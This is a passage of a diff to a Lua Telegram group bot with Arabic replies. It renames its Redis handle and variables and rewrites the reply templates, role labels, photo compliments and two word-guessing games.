+t = datahmade:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'  
 elseif is_vip(msg) then
-t = database:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
+t = datahmade:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
 else
-t = database:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
+t = datahmade:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
 end
-if not database:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
-if not database:get('MohaMeD:'..bot_id..'id:photo'..msg.chat_id_) then
-if not database:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_) then 
-local keko_text = {
+if not datahmade:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'id:photo'..msg.chat_id_) then
+if not datahmade:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_) then 
+local ahmad_text = {
 'صورتك فدشي 😘😔❤️  ',
 "صارلك شكد مخليه ",
-"وفالله 😔💘",
+"له له مغير صورته الوصخ 😹",
+"الشخصيه الزينه عمي 👀",
+"تخليني🤤♥️",
+"دغيرها شلزكت بيها 😪",
 "كشخه برب 😉💘",
-"دغيره شبي هذ 😒",
-"عمري الحلوين 🙈💘",
+"يعني الوك 👨🏻‍🚒",
+"منور ضلعي🙈💘",
 }
-keko3 = math.random(#keko_text)
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"🎥┇ "..keko_text[keko3].."\n🎟┇ ايديك • "..msg.sender_user_id_.."\n🎫┇ يوزرك • "..keko_info.."\n🛰┇ موقعك • "..t.."\n📖┇ رسائلك •("..user_msgs..")\n🗃┇ سحكاتك •("..edit..")\n📓┇ تفاعلك • ("..ikeko_text..")\n🤹🏻‍♂️┇ مجوهراتك • ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ",msg.id_,msg.id_.."")
+ahmad3 = math.random(#ahmad_text)
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"📷╗  "..ahmad_text[ahmad3].."\n🎟╣ ايديك ~⪼ "..msg.sender_user_id_.."\n🎭╣ معرفك ~⪼ "..ahmad_info.."\n📌╣ موقعك ~⪼ "..t.."\n💌╣ رسائلك ~⪼ ("..user_msgs..")\n✏╣ السحكات ~⪼ ("..edit..")\n🎲╣ تفاعلك ~⪼ ("..iahmad_text..")\n💎╝ مجوهراتك ~⪼ ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ",msg.id_,msg.id_.."")
 else 
-local MohaMeD_new_text = database:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_)
-local MohaMeD_new_text = MohaMeD_new_text:gsub('#username',(keko_info or 'لا يوجد'))
+local MohaMeD_new_text = datahmade:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_)
+local MohaMeD_new_text = MohaMeD_new_text:gsub('#username',(ahmad_info or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#edit',(edit or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#stast',(t or 'لا يوجد'))
-local MohaMeD_new_text = MohaMeD_new_text:gsub('#auto',(ikeko_text or 'لا يوجد'))
+local MohaMeD_new_text = MohaMeD_new_text:gsub('#auto',(iahmad_text or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#photos',(all_photo_MohaMeD or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#game',(nko or 'لا يوجد'))
 sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,MohaMeD_new_text,msg.id_,msg.id_.."")
 end
 else
 if msg.sender_user_id_ == tonumber(sudo_add) then
-t = 'المطور الاساسي 👨🏻‍🔧'
+t = 'المطور الاساسي 👨🏻‍💻'
 elseif is_sudo(msg) then
-t = database:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
+t = datahmade:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'المطور 👨🏻‍🔧'
 elseif is_creatorbasic(msg) then
-t = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_creator(msg) then
-t = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_owner(msg) then
-t = database:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
+t = datahmade:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
 elseif is_mod(msg) then
-t = database:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
+t = datahmade:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
 elseif is_vip(msg) then
-t = database:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
+t = datahmade:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
 else
-t = database:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
+t = datahmade:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
 end
-if not database:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_) then 
-send(msg.chat_id_, msg.id_, 1, "🎟┇ ايديك • ("..msg.sender_user_id_..")\n🎫┇ يوزرك • "..keko_info.."\n📌┇ موقعك • "..t.."\n📖┇ رسائلك • ("..user_msgs..")\n🗃┇ سحكاتك • ("..edit..")\n📓┇ تفاعلك • "..ikeko_text.."\n🤹🏻‍♂️┇ مجوهراتك •  ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ", 1, 'html')
+if not datahmade:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_) then 
+send(msg.chat_id_, msg.id_, 1, "🎟╣ ايديك ~⪼ ("..msg.sender_user_id_..")\n🎭╣ معرفك ~⪼ "..ahmad_info.."\n📌╣ موقعك ~⪼ "..t.."\n💌╣ رسائلك ~⪼ ("..user_msgs..")\n✏╣ السحكات ~⪼ ("..edit..")\n🎲╣ تفاعلك ~⪼ "..iahmad_text.."\n💎╝ مجوهراتك  ~⪼  ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ", 1, 'html')
 else 
-local MohaMeD_new_text = database:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_)
-local MohaMeD_new_text = MohaMeD_new_text:gsub('#username',(keko_info or 'لا يوجد'))
+local MohaMeD_new_text = datahmade:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_)
+local MohaMeD_new_text = MohaMeD_new_text:gsub('#username',(ahmad_info or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#edit',(edit or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#stast',(t or 'لا يوجد'))   
-local MohaMeD_new_text = MohaMeD_new_text:gsub('#auto',(ikeko_text or 'لا يوجد'))
+local MohaMeD_new_text = MohaMeD_new_text:gsub('#auto',(iahmad_text or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#photos',(all_photo_MohaMeD or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#game',(nko or 'لا يوجد'))
 send(msg.chat_id_, msg.id_, 1, MohaMeD_new_text, 1, 'html')
@@ -7959,74 +7826,74 @@ else
 end
 else
 if msg.sender_user_id_ == tonumber(sudo_add) then
-t = 'المطور الاساسي 👨🏻‍🔧'
+t = 'المطور الاساسي 👨🏻‍💻'
 elseif is_sudo(msg) then
-t = database:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
+t = datahmade:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'المطور👨🏻‍🔧'
 elseif is_creatorbasic(msg) then
-t = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_creator(msg) then
-t = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_owner(msg) then
-t = database:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
+t = datahmade:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
 elseif is_mod(msg) then
-t = database:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🏿‍'
+t = datahmade:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍??'
 elseif is_vip(msg) then
-t = database:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
+t = datahmade:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
 else
-t = database:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
+t = datahmade:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
 end
-if not database:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
-if not database:get('MohaMeD:'..bot_id..'id:photo'..msg.chat_id_) then
-if not database:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_) then 
-send(msg.chat_id_, msg.id_, 1,"🎥┇ انت لا تملك صوره لحسابك !\n🎟┇ ايديك • "..msg.sender_user_id_.."\n🎫┇ يوزرك • "..keko_info.."\n🛰┇ موقعك •   "..t.."\n📖┇ رسائلك •  ("..user_msgs..")\n🗃┇ سحكاتك • ("..edit..")\n📓┇ تفاعلك • "..ikeko_text.."\n🤹🏻‍♂️┇ مجوهراتك • ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ", 1, 'html')
+if not datahmade:get('MohaMeD:'..bot_id..'id:mute'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'id:photo'..msg.chat_id_) then
+if not datahmade:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_) then 
+send(msg.chat_id_, msg.id_, 1,"📷╗  انت لا تملك صوره لحسابك !\n🎟╣ ايديك ~⪼ "..msg.sender_user_id_.."\n🎭╣ معرفك ~⪼ "..ahmad_info.."\n📌╣ موقعك ~⪼ "..t.."\n💌╣ رسائلك ~⪼ ("..user_msgs..")\n✏╣ السحكات ~⪼ ("..edit..")\n🎲╣ تفاعلك ~⪼ "..iahmad_text.."\n💎╝ مجوهراتك ~⪼ ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ", 1, 'html')
 else 
-local MohaMeD_new_text = database:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_)
-local MohaMeD_new_text = MohaMeD_new_text:gsub('#username',(keko_info or 'لا يوجد'))
+local MohaMeD_new_text = datahmade:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_)
+local MohaMeD_new_text = MohaMeD_new_text:gsub('#username',(ahmad_info or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#edit',(edit or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#stast',(t or 'لا يوجد'))   
-local MohaMeD_new_text = MohaMeD_new_text:gsub('#auto',(ikeko_text or 'لا يوجد'))
+local MohaMeD_new_text = MohaMeD_new_text:gsub('#auto',(iahmad_text or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#photos',(all_photo_MohaMeD or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#game',(nko or 'لا يوجد'))
 send(msg.chat_id_, msg.id_, 1, MohaMeD_new_text, 1, 'html')
 end
 else
 if msg.sender_user_id_ == tonumber(sudo_add) then
-t = 'المطور الاساسي 👨🏻‍🔧'
+t = 'المطور الاساسي 👨🏻‍💻'
 elseif is_sudo(msg) then
-t = database:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
+t = datahmade:get("MohaMeD:name_sudo"..bot_id..msg.chat_id_)  or 'المطور 👨🏻‍🔧'
 elseif is_creatorbasic(msg) then
-t = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_creator(msg) then
-t = database:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 🏻‍✈️'
-elseif (database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and database:get("MohaMeD:all_sl:"..database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
-t = database:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
+t = datahmade:get("MohaMeD:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 🏻‍✈️'
+elseif (datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) and datahmade:get("MohaMeD:all_if:"..datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_) ..bot_id..msg.chat_id_)) then 
+t = datahmade:get("MohaMeD:name_user:"..bot_id..msg.chat_id_..msg.sender_user_id_)
 elseif is_owner(msg) then
-t = database:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
+t = datahmade:get("MohaMeD:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
 elseif is_mod(msg) then
-t = database:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
+t = datahmade:get("MohaMeD:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
 elseif is_vip(msg) then
-t = database:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
+t = datahmade:get("MohaMeD:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
 else
-t = database:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
+t = datahmade:get("MohaMeD:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
 end
-if not database:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_) then 
-send(msg.chat_id_, msg.id_, 1,"🎟┇ ايديك •  ("..msg.sender_user_id_..")\n🎫┇ يوزرك • "..keko_info.."\n🛰┇ موقعك • "..t.."\n📖┇ رسائلك • {"..user_msgs..")\n🗃┇ سحكاتك • ("..edit..")\n📓┇ تفاعلك • "..ikeko_text.."\n🤹🏻‍♂️┇ مجوهراتك •  ("..nko..")\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ", 1, 'html')
+if not datahmade:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_) then 
+send(msg.chat_id_, msg.id_, 1, "🎟╣ ايديك ~⪼ ("..msg.sender_user_id_..")\n🎭╣ معرفك ~⪼ "..ahmad_info.."\n📌╣ موقعك ~⪼ "..t.."\n💌╣ رسائلك ~⪼ ("..user_msgs..")\n✏╣ السحكات ~⪼ ("..edit..")\n🎲╣ تفاعلك ~⪼ "..iahmad_text.."\n💎╝ مجوهراتك  ~⪼  ("..nko..")\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ", 1, 'html')
 else 
-local MohaMeD_new_text = database:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_)
-local MohaMeD_new_text = MohaMeD_new_text:gsub('#username',(keko_info or 'لا يوجد'))
+local MohaMeD_new_text = datahmade:get("MohaMeD:gr:id:text:"..bot_id..msg.chat_id_)
+local MohaMeD_new_text = MohaMeD_new_text:gsub('#username',(ahmad_info or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#edit',(edit or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#msgs',(user_msgs or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#stast',(t or 'لا يوجد'))   
-local MohaMeD_new_text = MohaMeD_new_text:gsub('#auto',(ikeko_text or 'لا يوجد'))
+local MohaMeD_new_text = MohaMeD_new_text:gsub('#auto',(iahmad_text or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#photos',(all_photo_MohaMeD or 'لا يوجد'))
 local MohaMeD_new_text = MohaMeD_new_text:gsub('#game',(nko or 'لا يوجد'))
 send(msg.chat_id_, msg.id_, 1, MohaMeD_new_text, 1, 'html') 
@@ -8043,14 +7910,14 @@ offset_ = 0,
 limit_ = 1
 }, getpro, nil)
 end
-getUser(msg.sender_user_id_, keko333)
+getUser(msg.sender_user_id_, ahmad333)
 end
 end
 ------------------------------------------------------------------------
 if text then
-if database:sismember('MohaMeD:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,text) then
+if datahmade:sismember('MohaMeD:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_,text) then
 else
-database:del('MohaMeD:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_) 
+datahmade:del('MohaMeD:'..bot_id..'spam:id'..msg.sender_user_id_..':'..msg.chat_id_) 
 end
 end
 
@@ -8080,8 +7947,8 @@ getUser(memb[2],whois)
 end
 ------------------------------------------------------------------------
 if text == ("مشاهده منشور") then
-database:set('MohaMeD:'..bot_id..'viewget'..msg.sender_user_id_,true)
-send(msg.chat_id_, msg.id_, 1, '📥┇قم بارسال المنشور الان ',1, 'md')
+datahmade:set('MohaMeD:'..bot_id..'viewget'..msg.sender_user_id_,true)
+send(msg.chat_id_, msg.id_, 1, '??┇قم بارسال المنشور الان ',1, 'md')
 end
 ------------------------------------------------------------------------
 if text == "صلاحياته" and tonumber(msg.reply_to_message_id_) > 0 then    
@@ -8114,35 +7981,35 @@ end
 end
 
 ------------------------------------------------------------------------
-if text == 'سمايلات' and database:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
-database:del('MohaMeD:'..bot_id..'l:ids'..msg.chat_id_)
+if text == 'سمايلات' and datahmade:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
+datahmade:del('MohaMeD:'..bot_id..'l:ids'..msg.chat_id_)
 katu = {'🍏','🍎','🍐','🍊','🍋','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🥖','🥐','🍞','🥨','🍟','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍠','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🎲','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🎟','🎫','🎗','🏵','🎖','🏆','🥌','🛷','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔','🛡','🔮','🌡','💣','📌','📍','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
 name = katu[math.random(#katu)]
-database:set('MohaMeD:'..bot_id..'klmos'..msg.chat_id_,name)
+datahmade:set('MohaMeD:'..bot_id..'klmos'..msg.chat_id_,name)
 taha = '🚀┇اسرع واحد يدز » {`'..name..'`}'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 end
 ------------------------------------------------------------------------
-if text == ''..(database:get('MohaMeD:'..bot_id..'klmos'..msg.chat_id_) or 'لفاتع')..'' and not database:get('MohaMeD:'..bot_id..'l:ids'..msg.chat_id_) then
-if not database:get('MohaMeD:'..bot_id..'l:ids'..msg.chat_id_) then 
+if text == ''..(datahmade:get('MohaMeD:'..bot_id..'klmos'..msg.chat_id_) or 'لفاتع')..'' and not datahmade:get('MohaMeD:'..bot_id..'l:ids'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'l:ids'..msg.chat_id_) then 
 taha = '*👾| مبروك لقد فزت ,\n🎮| للعب مره اخرى ارسل سمايلات ,*'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
-database:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
-database:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
+datahmade:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
+datahmade:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
 end
-database:set('MohaMeD:'..bot_id..'l:ids'..msg.chat_id_,true)
+datahmade:set('MohaMeD:'..bot_id..'l:ids'..msg.chat_id_,true)
 end 
 ------------------------------------------------------------------------
-if text == 'الاسرع' and database:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
-database:del('MohaMeD:'..bot_id..'l:id'..msg.chat_id_)
-katu = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
+if text == 'الاسرع' and datahmade:get('MohaMeD:'..bot_id..'lock_geam'..msg.chat_id_) then
+datahmade:del('MohaMeD:'..bot_id..'l:id'..msg.chat_id_)
+katu = {'سحور','سياره','استقبال','قنفه','ظرطه','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
 name = katu[math.random(#katu)]
-database:set('MohaMeD:'..bot_id..'klmo'..msg.chat_id_,name)
+datahmade:set('MohaMeD:'..bot_id..'klmo'..msg.chat_id_,name)
 name = string.gsub(name,'سحور','س ر و ح')
 name = string.gsub(name,'سياره','ه ر س ي ا')
 name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
 name = string.gsub(name,'قنفه','ه ق ن ف')
-name = string.gsub(name,'ايفون','و ن ف ا')
+name = string.gsub(name,'ظرطه','ر ط ظ ه')
 name = string.gsub(name,'بزونه','ز و ه ن')
 name = string.gsub(name,'مطبخ','خ ب ط م')
 name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
@@ -8182,21 +8049,21 @@ taha = '🚀┇اسرع واحد يرتبها » {'..name..'}'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
 end
 ------------------------------------------------------------------------
-if text == ''..(database:get('MohaMeD:'..bot_id..'klmo'..msg.chat_id_) or 'لفاتع')..'' and not database:get('MohaMeD:'..bot_id..'l:id'..msg.chat_id_) then
-if not database:get('MohaMeD:'..bot_id..'l:id'..msg.chat_id_) then 
+if text == ''..(datahmade:get('MohaMeD:'..bot_id..'klmo'..msg.chat_id_) or 'لفاتع')..'' and not datahmade:get('MohaMeD:'..bot_id..'l:id'..msg.chat_id_) then
+if not datahmade:get('MohaMeD:'..bot_id..'l:id'..msg.chat_id_) then 
 taha = '*👾| مبروك لقد فزت ,\n🎮| للعب مره اخرى ارسل الاسرع ,*'
 send(msg.chat_id_, msg.id_, 1,taha, 1, 'md')
-database:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1) 
-database:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
+datahmade:incrby('MohaMeD:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_, 1) 
+datahmade:incrby('MohaMeD:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_, 1)    
 end
